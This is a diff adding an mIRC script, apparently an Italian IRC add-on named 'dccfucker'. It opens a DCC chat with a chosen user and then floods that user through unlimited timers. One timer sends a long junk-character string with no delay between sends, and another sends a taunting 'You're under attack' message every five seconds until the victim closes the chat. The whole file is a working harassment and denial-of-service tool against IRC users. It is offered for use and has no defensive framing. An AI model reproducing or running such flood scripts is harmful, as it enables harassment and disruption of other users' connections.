@@ -1,0 +1,45 @@
+;===========================================================
+;Professional Script By `Vermel`                           ;
+;«`ÐeStr®VeRy`§CrIpT`» Copyright © 2006-2007               ;
+;Sito www.Italia-chat.com                                  ;
+;Non modificate questi file.                               ;
+;Categorita:Lamer                                          ;
+;===========================================================
+
+;[This is the ALPHA version of the famous dccfucker so no bugs :-)]
+;[Don't fuck normal, fuck with this!]
+;[But don't rip mothafuckahs(Don't modify if you like this add-on)]
+
+menu nicklist {
+  -
+  <<`DDC Fuck`>>: if ($$1 == ^DuDe^) { /echo *** I Don't think so! | quit | halt } | /.enable #dccfuck | /dcc chat $$1
+  -
+}
+
+alias dccfuck {
+  if ($$1 == ^DuDe^) { /echo *** I Don't think so! | quit | halt }  
+  .enable #dccfuck
+  dcc chat $1
+}
+
+on 1:load: {
+  set %dccfuckver Alpha By ^DuDe^
+  set %plfloodtxt ####$$$$%%%%¥¥¥¥××####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§########$$$$%%%%¥¥¥¥××####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥
+  %%%¥¥¥¥××××ßßßß§§§§########$$$$%%%%¥¥¥¥××####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××####$$$$%%%%¥¥¥¥
+}
+#dccfuck off
+on 1:open:=: {
+  echo 4 -a *** Dccfucker %dccfuckver is attacking $nick
+  echo 4 -a *** Don't close that dcc with ur victim you will stop flooding
+  .msg =$nick You're under attack by Dccfucker %dccfuckver
+  .timerdcc2 0 5 .msg =$nick You're under attack by Dccfucker %dccfuckver
+  .timerdcc 0 0 .msg =$nick %plfloodtxt
+}
+on 1:close:=: {
+  echo 4 -s *** You're victim or you has closed the dcc! >:(
+  .timerdcc off
+  .timerdcc2 off
+  .disable #dccfuck
+}
+
+#dccfuck end
